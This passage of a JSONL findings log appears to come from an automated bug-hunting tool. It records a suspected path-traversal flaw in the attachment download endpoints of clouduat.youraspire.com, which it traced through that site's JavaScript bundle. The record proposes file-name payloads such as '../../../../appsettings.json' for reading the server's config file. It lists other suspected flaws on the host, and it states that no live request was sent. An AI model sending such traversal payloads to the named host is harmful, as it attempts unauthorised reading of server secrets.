GetExportDownloadUrl, BlobContainer, BlobPath or blob-export entry exists in findings/candidates.jsonl, findings/rejected.jsonl, findings/archive.jsonl or findings/confirmed.jsonl.","artifacts":{"bundle":"clouduat.youraspire.com main.352e10647eddc8f4.js","sha256":"c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697","size":13525804,"local_copy":"/root/hackbot-architecture/state/recon/aspire/js/main.352e10647eddc8f4.js","exact_snippets":["getExportDownloadUrl(Mt,nt,yt){const mt=we.getResourceUrl(\"GetExportDownloadUrl\");return yield we.httpClient.post(mt,{BlobContainer:Mt,BlobPath:nt,FileName:yt},{responseType:\"text\"}).toPromise()}","const Fi=yield ti.advancedSearchServiceFactory.Create(Gt.ObjectCode??\"\").getExportDownloadUrl(Gt.BlobContainer,Gt.BlobPath,Gt.FileName);Fi&&(k.saveAs(Fi,Gt.FileName)"]},"added_by":"hunt-pass-aspire-path-traversal","added_at":"2026-11-06T15:04:45Z"}
{"host":"clouduat.youraspire.com","endpoint":"attachments service via the BFF: POST /proxy/attachments/api/Attachments/AttachmentUpload (client resource name \"AttachmentUpload\", base = environmentConfig.attachmentsApiBaseUrl \"/proxy/attachments\" + \"/api/Attachments\") -> persisted attachment record -> GET /proxy/attachments/api/FileAccess/FileDownload?filePath=AspireUploads/{AspireSystemID}/{UniqueId}{FileExtension}&fileName={OriginalFileName} ; the same unvalidated path also feeds the blob fetch GET /proxy/attachments/AspireUploads/{AspireSystemID}/{UniqueId}{FileExtension} used for image/PDF preview","param":"FileExtension (client-computed from the uploaded file name and transported inside the IncomingAttachment object of the upload body) together with OriginalFileName","vuln_class":"CWE-22 Path Traversal / arbitrary file read (LFI) - untrusted client-supplied attachment extension/name is persisted and concatenated into a file path that is handed to a file-serving endpoint, with no traversal normalisation anywhere on the client","evidence":"Deterministic code facts, byte-verified in the shipped bundle clouduat.youraspire.com main.352e10647eddc8f4.js (sha256 c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697, 13,525,804 bytes; hash recomputed this pass, identical to the copy used by earlier validations). (1) THE UPLOAD BODY CARRIES THE CLIENT-BUILT ATTACHMENT OBJECT: uploadAttachment(Ke,Re,rt,et,pe){ ... const $=ce.getResourceUrl(\"AttachmentUpload\"),U=yield ce.convertFileToString(Re); return ce.httpClient.post($,new te(Ke,Re.name,U,rt,et,pe)).toPromise() } with class te{constructor(k,Ke,Re,rt,et,pe){this.IncomingAttachment=k,this.FileName=Ke,this.FileData=Re,this.QACategoryId=rt,this.PropertyQAId=et,this.skipComment=pe}} - so the whole client attachment object is IncomingAttachment and the file name is sent verbatim. The only caller chain is startUploadOfFiles(){ ... Pe.push(De.attachmentsLogicService.upload(ct.Attachment,ct.File,Fe,De.qaCategoryId,De.propertyQACategoryId,De.skipComment)) } -> upload(pe,ce,$,U,J,b){ ... me.attachmentsService.uploadAttachment(pe,ce,U,J,b) }, i.e. the first argument really is the client-side attachment object. (2) THE EXTENSION IS ATTACKER-CONTROLLED: setCurrentAttachment(De){ ... this.attachment.FileExtension=`.${this.attachmentsLogicService.getFileExtension(De.File)}` ... } with getFileExtension(pe){return pe.name.split(\".\").pop()} - the stored extension segment is derived from the client-supplied file name and (because the field travels in the request body) is directly setable on the wire. (3) THE PATH IS BUILT BY PLAIN STRING CONCATENATION AND PASSED TO A FILE-READ ENDPOINT: getAttachmentDownloadPath(Ke){return `AspireUploads/${Ke.AspireSystemID}/${Ke.UniqueId}${Ke.FileExtension}`} ; downloadAttachment(Ke){ let rt=Re.getAttachmentDownloadPath(Ke); const et=r.KD.toQueryString({filePath:rt,fileName:Ke.OriginalFileName}); yield Re.fileService.downloadFile(Ke.OriginalFileName,\"/api/FileAccess/FileDownload\",et) } ; downloadFile(V,z,te){ ... yield q.download(`${q.environmentConfig.attachmentsApiBaseUrl}${z}?${te}`,V) } -> GET /proxy/attachments/api/FileAccess/FileDownload?filePath=AspireUploads/<sysid>/<uniqueid><ext>&fileName=<orig>. Because filePath travels as a QUERY value the browser does not normalise \"..\" segments, so the server receives them raw. The same value also feeds the blob fetch: getImageDownloadPath(pe){return pe.File?this.getUrlFromAttachmentDataFile(pe):`/api/FileAccess/${this.attachmentsService.getAttachmentDownloadPath(pe.Attachment)}`} and getPdfDownloadPath() -> fileService.getFile(getAttachmentDownloadPath(pe.Attachment)) with getFile(V){const z=`${this.environmentConfig.attachmentsApiBaseUrl}${this.cleansePath(V)}`;return this.httpClient.get(z,{responseType:\"blob\"}).toPromise()}. (4) THE APP'S PATH CLEANSER DOES NOT BLOCK TRAVERSAL: cleansePath(V){return\"~\"===V[0]&&(V=V.substring(1)),!V.startsWith(\"/\")&&\"http\"!==V.substring(0,4)&&(V=`/${V}`),V.startsWith(\"//\")&&(V=V.replace(\"//\",\"/\")),V} - it strips a leading tilde, adds a leading slash and collapses a leading double slash; it never removes, encodes or rejects \"..\". That is the entire sanitisation applied to a value that becomes the file path of a read endpoint.","confidence":"low","validation":{"artifact_sha256_recomputed":"c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697","artifact_size_bytes":13525804,"claim_sha256_match":true,"client_side_traversal_filter_present":false,"cleansePath_neutralises_dotdot":false,"filepath_transmitted_as_query_value":true,"filepath_derived_from_upload_input":true,"server_side_join_verified":false,"live_verification":"none performed - in-scope hosts return an edge-WAF 403 to this VPS egress (non-destructive mandate; no request sent)","duplicate_of_decided":false},"missing_evidence":"The server half is not observable in shipped artifacts and was NOT tested. Needed to turn this into a finding: (a) an authenticated upload whose name/FileExtension contains traversal (e.g. OriginalFileName `x.../../../../../appsettings.json` or FileExtension `...../../../../appsettings.json`) is accepted and persisted - server-side type/size validation and the exact FileExtension extraction (last-dot vs server-normalised) are unknown; (b) FileDownload and/or the AspireUploads blob route resolves the joined path OUTSIDE the upload root and returns a file outside it, contrasted with a normal-extension negative test; (c) how the backend joins the path (Path.Combine + GetFullPath + root StartsWith guard, or raw open) and whether AspireSystemID/UniqueId are validated as GUIDs. If the backend canonicalises and enforces the root, there is no bug. Not a duplicate: no youraspire/Aspire path-traversal, FileDownload, filePath or cleansePath entry exists in findings/candidates.jsonl, findings/rejected.jsonl, findings/archive.jsonl or findings/confirmed.jsonl (the only clouduat entries there are the attachment-preview blob XSS, the eval/formula code-injection, the MarketingPro URL-allowlist redirect and the config/MD5 items).","artifacts":{"bundle":"clouduat.youraspire.com main.352e10647eddc8f4.js","sha256":"c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697","size":13525804,"local_copy":"/root/hackbot-architecture/state/recon/aspire/js/main.352e10647eddc8f4.js","exact_snippets":["uploadAttachment(Ke,Re,rt,et,pe){ ... ce.httpClient.post($,new te(Ke,Re.name,U,rt,et,pe))","class te{constructor(k,Ke,Re,rt,et,pe){this.IncomingAttachment=k,this.FileName=Ke,this.FileData=Re,this.QACategoryId=rt,this.PropertyQAId=et,this.skipComment=pe}}","this.attachment.FileExtension=`.${this.attachmentsLogicService.getFileExtension(De.File)}`","getFileExtension(pe){return pe.name.split(\".\").pop()}","getAttachmentDownloadPath(Ke){return `AspireUploads/${Ke.AspireSystemID}/${Ke.UniqueId}${Ke.FileExtension}`}","downloadAttachment(Ke){ let rt=Re.getAttachmentDownloadPath(Ke); const et=r.KD.toQueryString({filePath:rt,fileName:Ke.OriginalFileName}); yield Re.fileService.downloadFile(Ke.OriginalFileName,\"/api/FileAccess/FileDownload\",et) }","cleansePath(V){return\"~\"===V[0]&&(V=V.substring(1)),!V.startsWith(\"/\")&&\"http\"!==V.substring(0,4)&&(V=`/${V}`),V.startsWith(\"//\")&&(V=V.replace(\"//\",\"/\")),V}"]},"added_by":"hunt-pass-aspire-path-traversal","added_at":"2026-11-06T15:04:45Z"}
